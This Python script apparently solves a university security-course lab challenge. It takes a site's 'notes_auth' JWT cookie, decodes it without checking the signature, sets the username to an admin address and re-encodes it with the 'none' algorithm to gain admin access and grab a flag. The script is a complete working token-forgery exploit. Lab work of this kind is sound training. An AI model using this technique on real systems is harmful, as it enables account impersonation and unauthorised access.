#!/usr/bin/env python

import jwt
import re
import requests
import time


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


s = requests.Session()

s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
flag_pattern = re.compile(r"COMP6443\{.+?\}")

url = "https://notes.quoccacorp.com"

r = s.get(url)

token = s.cookies.get("notes_auth")
print(f"{colors.GREEN}[+] JWT: {colors.RESET}{token}")

payload = jwt.decode(token, options={"verify_signature": False})
print(f"{colors.YELLOW}[+] Payload: {colors.RESET}{payload}")

payload["Username"] = "admin@quoccacorp.com"
payload["iat"] = int(time.time())

auth = jwt.encode(payload, key=None, algorithm="none")
print(f"{colors.YELLOW}[+] Modified Token: {colors.RESET}{auth}")

s.cookies.clear()
s.cookies.set("notes_auth", auth)
token = s.cookies.get("notes_auth")
payload = jwt.decode(token, options={"verify_signature": False})
print(f"{colors.YELLOW}[+] Confirm Payload: {colors.RESET}{payload}")

result = s.get(url)
flag = flag_pattern.search(result.text)

if flag:
    print(f"{colors.PURPLE}[+] Flag: {colors.RESET}{flag.group()}")
else:
    print(f"{colors.RED}[!] Flag not found!{colors.RESET}")
    print(result.text)
